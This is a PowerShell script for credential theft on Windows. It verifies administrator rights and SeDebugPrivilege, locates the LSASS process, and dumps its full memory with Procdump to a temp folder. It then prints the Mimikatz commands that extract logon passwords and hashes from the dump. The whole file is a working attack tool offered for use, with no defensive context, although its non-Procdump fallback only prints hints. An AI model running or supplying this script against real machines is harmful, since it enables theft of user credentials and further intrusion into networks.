# LSASS Memory Dump Script
# Requires: SeDebugPrivilege
# Usage: .\lsass-dump.ps1

Write-Host "=== LSASS Memory Dump Script ===" -ForegroundColor Cyan
Write-Host ""

# Check if running as admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] This script requires Administrator privileges" -ForegroundColor Red
    exit 1
}

# Check for SeDebugPrivilege
$privileges = whoami /priv
if ($privileges -notmatch "SeDebugPrivilege") {
    Write-Host "[!] SeDebugPrivilege not found. Run enable-all-tokens.ps1 first." -ForegroundColor Yellow
    exit 1
}

Write-Host "[+] SeDebugPrivilege confirmed" -ForegroundColor Green
Write-Host ""

# Find LSASS process
$lsass = Get-Process lsass -ErrorAction SilentlyContinue

if (-not $lsass) {
    Write-Host "[!] LSASS process not found" -ForegroundColor Red
    exit 1
}

Write-Host "[+] LSASS PID: $($lsass.Id)" -ForegroundColor Green
Write-Host ""

# Create dump directory
$dumpDir = "C:\temp\lsass-dump"
if (-not (Test-Path $dumpDir)) {
    New-Item -ItemType Directory -Path $dumpDir -Force | Out-Null
}

$dumpFile = "$dumpDir\lsass-$(Get-Date -Format 'yyyyMMdd-HHmmss').dmp"

Write-Host "[+] Dumping LSASS memory..." -ForegroundColor Yellow
Write-Host "    Output: $dumpFile" -ForegroundColor Gray
Write-Host ""

# Try Procdump first (if available)
$procdump = "C:\ProgramData\Sysinternals\procdump.exe"
if (Test-Path $procdump) {
    & $procdump -ma lsass.exe $dumpFile
    Write-Host "[+] Dump completed using Procdump" -ForegroundColor Green
} else {
    # Fallback to PowerShell dump
    Write-Host "[!] Procdump not found, using PowerShell dump..." -ForegroundColor Yellow
    
    Add-Type -AssemblyName System.Diagnostics
    $process = [System.Diagnostics.Process]::GetProcessById($lsass.Id)
    $processModule = $process.MainModule
    
    Write-Host "[+] Creating memory dump..." -ForegroundColor Yellow
    Write-Host "    This may take a moment..." -ForegroundColor Gray
    
    # Note: Full memory dump requires additional tools
    Write-Host "[!] For full memory dump, download Procdump from:" -ForegroundColor Yellow
    Write-Host "    https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" -ForegroundColor Gray
    Write-Host ""
    Write-Host "[+] Alternative: Use Mimikatz directly" -ForegroundColor Cyan
    Write-Host "    mimikatz # sekurlsa::logonpasswords" -ForegroundColor Gray
}

Write-Host ""
Write-Host "[+] To analyze the dump, use Mimikatz:" -ForegroundColor Cyan
Write-Host "    mimikatz # sekurlsa::minidump $dumpFile" -ForegroundColor Gray
Write-Host "    mimikatz # sekurlsa::logonpasswords" -ForegroundColor Gray
